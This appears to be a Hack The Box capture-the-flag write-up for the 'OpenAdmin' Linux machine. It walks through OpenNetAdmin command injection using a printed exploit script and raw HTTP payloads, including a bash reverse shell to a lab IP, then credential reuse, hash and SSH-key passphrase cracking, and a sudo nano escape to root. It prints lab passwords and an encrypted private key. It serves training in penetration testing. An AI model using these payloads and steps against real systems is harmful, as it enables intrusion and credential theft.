# OpenAdmin
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `www-data` | OpenNetAdmin (ONA) RCE | Discovered OpenNetAdmin 18.1.1 running on the `/ona` directory. Used a public exploit to leverage a command injection vulnerability. This allowed me to execute a reverse shell payload, gaining an initial shell on the machine as the `www-data` user. |
| 2 | `jimmy` | Database Credential Reuse & SSH | Upon gaining a shell, I enumerated the ONA application's directory and found the database configuration file (`/var/www/html/ona/local/config/database_settings.inc.php`). This file contained credentials for the `ona_sys` database user: `n1nj4W4rri0R!`. I tried to reuse this password for other users on the system and was able to successfully log in via SSH as the user `jimmy`. |
| 3 | `joanna` | Port Forwarding & Password Cracking | As `jimmy`, I noticed an unusual local service running on port `52846`. I configured an SSH tunnel (`ssh -L 8081:127.0.0.1:52846 jimmy@...`) to access this service from my local machine. The service presented a login page. I found the credentials hardcoded in the application's source code: `jimmy` and a SHA512 hash. Cracking this hash revealed the password `Revealed`. Logging in with these credentials led to the discovery of a passphrase-protected SSH key for the user `joanna`. I cracked the key's passphrase (`bloodninjas`) using `john` and used the key to log in as `joanna` via SSH. |
| 4 | `root` | Sudo Misconfiguration (GTFOBins) | After gaining access as `joanna`, I checked her `sudo` permissions and found she could run `nano` on the file `/opt/priv` as any user, including `root`, without a password. I leveraged a GTFOBins exploit for `nano`, which involves using `^R^X` to execute a command from within the editor, to spawn a root shell. |



## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can see apache is running over ubuntu.  
Without further doing let's dig into the site. As we open the site, we can see the default apache page, so let's enumerate if there is any directory available.
```
/music                (Status: 301) [Size: 312] [--> http://10.10.10.171/music/]
/artwork              (Status: 301) [Size: 314] [--> http://10.10.10.171/artwork/]
/sierra               (Status: 301) [Size: 313] [--> http://10.10.10.171/sierra/]
/server-status        (Status: 403) [Size: 277]
```
poking around on /music we can see a pretty standard template and a login button, if we click on the login button we got redirected to /ona which is running open net admin 18.1.1. So now, let's look for publicly available exploits:
```
[root@kali OpenAdmin ]$ searchsploit opennetadmin                 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                                                                                                                                                              | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                                                                                                                               | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                                                                                                                                                | php/webapps/47691.sh
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
It seems like OpenNetAdmin is affected by a RCE vulnerability, so let's try to leverage this and gain an initial foothold on the box.

## Foothold
Now that we found an exploit let's mirror ```php/webapps/47691.sh``` into our exploits/ directory and let's start examine what the exploit is about:  
```
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl -x --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```
As we can see the exploit is made of only one curl; the command execution is wrapped between ```BEGIN``` and ```END``` and sed extracts the result of command execution.  
Now let's try this exploit:  
```
[root@kali exploits ]$ ./47691.sh 10.10.10.171/ona/
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Now, as always, since the exploit works, let's send it over burp and analyze what is going on:  
```
POST /ona/ HTTP/1.1
Host: 10.10.10.171
User-Agent: curl/7.81.0
Accept: */*
Content-Length: 126
Content-Type: application/x-www-form-urlencoded
Connection: close

xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo "BEGIN";id;echo "END"&xajaxargs[]=ping
```
In the HTTP response, we can see within the html the following output of our RCE wrapped between BEGIN and END
```
BEGIN
uid=33(www-data) gid=33(www-data) groups=33(www-data)
END
```
Now, once we've tested that we have a remote code execution, let's use a more complex payload to test the resiliency of the application to our dangerous input characters
```
xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo "BEGIN";ping -c 1 10.10.14.24;echo "END"&xajaxargs[]=ping
```
Listening with tcpdump on the tun0 interface, we can see the following packets incoming
```
[root@kali OpenAdmin ]$ tcpdump -nettti tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 00:00:00.000000 ip: 10.10.10.171 > 10.10.14.24: ICMP echo request, id 4706, seq 1, length 64
 00:00:00.000013 ip: 10.10.14.24 > 10.10.10.171: ICMP echo reply, id 4706, seq 1, length 64
```
Now we can change our payload to the following, with the standard reverse tcp bash shell:
```
xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo "BEGIN";bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.24/4444+0>%261";echo "END"&xajaxargs[]=ping
```
and get a shell as www-data
```
root@kali:~/Documents/HTB/Boxes/OpenAdmin# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.171] 43374
bash: cannot set terminal process group (1242): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$
```

## User
Once we gain an initial foothold, let's look for database password into the OpenNetAdmin application directory.
```
www-data@openadmin:/var/www/html/ona$ grep -ri pass *    
[... SNIP ...]
local/config/database_settings.inc.php:        'db_passwd' => 'n1nj4W4rri0R!',   
[... SNIP ...]  
```
Now let's open the file looking for a database user:
```
www-data@openadmin:/var/www/html/ona$ less local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>
```
Now, with this credentials if we poke around into the mysql database we can find credentials for ona 'admin:admin' unfortunately this don't leads to anywhere so let's see if we can use the discovered password to ssh as another user:  
```
[root@kali OpenAdmin ]$ ssh -l jimmy $TARGET                      
jimmy@10.10.10.171's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Apr  3 10:08:09 UTC 2022

  System load:  0.0               Processes:             167
  Usage of /:   31.0% of 7.81GB   Users logged in:       0
  Memory usage: 14%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Apr  2 16:53:11 2022 from 10.10.14.24
-bash: warning: setlocale: LC_ALL: cannot change locale (en_GB.UTF-8)
jimmy@openadmin:~$
```
And we can login as jimmy.  
Unfortunately, under the home directory we cannot see the user.txt flag, so this means that we need to escalate to joanna user.  
Now following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, we can notice the following:
```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
Sudoers file: /etc/sudoers.d/joanna is readable
joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv
```
Unfortunately, we cannot leverage this, since we are jimmy user, but let's keep this in mind for root privilege escalation.  
Digging deeper we can find the following services listening:  
```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```
Now, let's configure port forwarding with ```~C``` (this has to be the first character we type) and see what this site is about.
```
jimmy@openadmin:~$
ssh> -L 8081:127.0.0.1:52846   
Forwarding port.
```
after we hit http://localhost:8081 we get a login prompt.  
Since we have a privileged access to the server let's check what this is about.  
Loking into the code we can find the following:  
```
if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
  $_SESSION['username'] = 'jimmy';
  header("Location: /main.php");
}
```
Now we can try to copy/paste the hash in google and, [this site](https://md5hashing.net/hash/sha512/00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1) shows that the sha512 hash corresponds to password 'Revealed'.  
Once we got the hash value, we can navigate to 127.0.0.1:8081 and insert the credentials jimmy:Revealed, as we log in we get an ssh private key possibly related to user joanna.  
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
```
As we can see in the key header, the key is encrypted, so let's use john to crack it.  
```
[root@kali keys ]$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_joanna_enc.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa_joanna_enc)     
1g 0:00:00:03 DONE (2022-04-02 19:22) 0.2994g/s 2866Kp/s 2866Kc/s 2866KC/s bloodninjas..bloodmore23
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Now that we have the key and the password for the key, we can login as user joanna and grab user.txt flag.  
```
[root@kali keys ]$ ssh -l joanna $TARGET -i id_rsa_joanna_enc
Enter passphrase for key 'id_rsa_joanna_enc':
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Apr  3 10:21:11 UTC 2022

  System load:  0.0               Processes:             172
  Usage of /:   31.0% of 7.81GB   Users logged in:       1
  Memory usage: 14%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Apr  2 17:25:45 2022 from 10.10.14.24
-bash: warning: setlocale: LC_ALL: cannot change locale (en_GB.UTF-8)
joanna@openadmin:~$
```

## Root
Now, as we found in earlier enumeration stages, we can leverage sudo to gain root access.  
```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
Let's check [GTFOBins for nano](https://gtfobins.github.io/gtfobins/nano/#sudo) with sudo, and follow the below steps documented on GTFOBins.  
```
sudo /bin/nano /opt/priv
^R^X
reset; sh 1>&0 2>&0
```
And as we type we get a shell as root
```
# id
uid=0(root) gid=0(root) groups=0(root)
```
